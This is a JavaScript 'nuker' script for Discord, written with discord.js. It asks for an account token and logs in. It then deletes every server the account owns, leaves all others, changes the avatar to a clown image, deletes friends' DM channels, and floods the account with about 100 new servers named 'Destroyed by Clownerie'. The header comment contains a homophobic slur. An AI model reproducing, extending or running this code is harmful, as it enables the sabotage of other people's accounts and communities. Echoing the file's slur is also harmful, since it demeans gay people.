/*
Dev By Blacklight
Don't skid, faggot
*/
import * as Discord from "discord.js"
import * as readline from 'readline'

let rl = readline.createInterface({
    input: process.stdin,
  output: process.stdout
})

let client = new Discord.Client()

rl.question('Entrez le token : ', (token) => {

    client.login(token)

})

client.once('ready', () => {

    console.clear
    console.info('Connecté')

    function cGuilds(){

        var nguild = ["Destroyed BY CWN", "Destroyed By Clownerie", "DestROYed bY cloWNerie", "DeStRoYeD bY cLoWnEriE", "NIQUED BY CLOWNERIE"]
        var nguilds = nguild[Math.floor(Math.random()*nguild.length)]

        for(var i = 100; i >= 0; i--) {
            client.user.createGuild(nguilds, 'europe', null)
    }
    }
    
    function lGuilds(){
    
        client.guilds.map((g) => { g.leave().catch(console.error)})
    
    }
    
    console.info('Destroying...')
    client.guilds.map((g) => { g.delete().catch(console.error)})
    client.user.setAvatar('https://cdn.discordapp.com/attachments/733972937425813516/775078883531030548/clown.png')
    client.user.friends.map((f) => {f.deleteDM().catch(console.error)})
    
    setTimeout(lGuilds, 1000)
    setTimeout(cGuilds, 5000)
})